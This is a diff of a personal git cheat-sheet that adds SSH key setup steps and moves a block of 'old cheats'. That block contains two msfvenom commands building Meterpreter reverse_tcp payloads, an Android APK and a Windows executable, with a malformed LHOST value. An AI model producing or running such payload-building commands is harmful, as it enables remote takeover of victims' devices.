@@ -29,21 +29,22 @@
 	1. unrelated-histories : git pull --allow-unrelated-histories 
 	
 
+=> SSH KEY SETUP on git bash window
+	1. cmd: git config --global user.email "israfil123.sa@gmail.com"
+	2. cmd : git config --global user.name "PHP Master"
+	3. open command prompt
+		cmd: ssh-keygen -t ed25519 -C "israfil123.sa@gmail.com"
+			or 
+		cmd for legacy system : ssh-keygen -t rsa -b 4096 -C "your_email@example.com" 
+	4. cat ~/.ssh/id_ed25519.pub
+	5. get the key and paste into ur github account https://github.com/settings/ssh/new
+	6. first push git@github.com:dontKnew/auth-providers.git ask for first time authentication
+	=> Testing for SSH Connection
+		1. ssh -vT git@github.com  #for debuging..
+		2. ssh -T git@github.com #msg ur github username if connected to github account
 
 
 
- OLD LUM SUMP CHEATS ::
- 
-18:60:24:1d:5d:96
- msfvenom –p android/meterpreter/reverse_tcp LHOST=18:60:24:1d:5d:96 LPORT=4444 R> ./ehacking.apk
-/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=18:60:24:1d:5d:96 -f exe -o payload.exe
-
-
-=> if u use link ssh:  git@github.com:username/respositoryName, u have generate ssh key
-
-1. generate ssh key
-	 => cd ~/.ssh && ssh-keygen
-2. cat filename.pub
 
 
 => Git Errors Solution : 
@@ -53,6 +54,12 @@
 	git remote set-url origin git@github.com:dontKnew/cheatsheet.git
 	git remote set-url origin https://github.com/dontKnew/food-devliery.git
 
+
+ OLD LUM SUMP CHEATS ::
+ 
+18:60:24:1d:5d:96
+ msfvenom –p android/meterpreter/reverse_tcp LHOST=18:60:24:1d:5d:96 LPORT=4444 R> ./ehacking.apk
+/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=18:60:24:1d:5d:96 -f exe -o payload.exe
 1. create branch
 git branch branchname
 
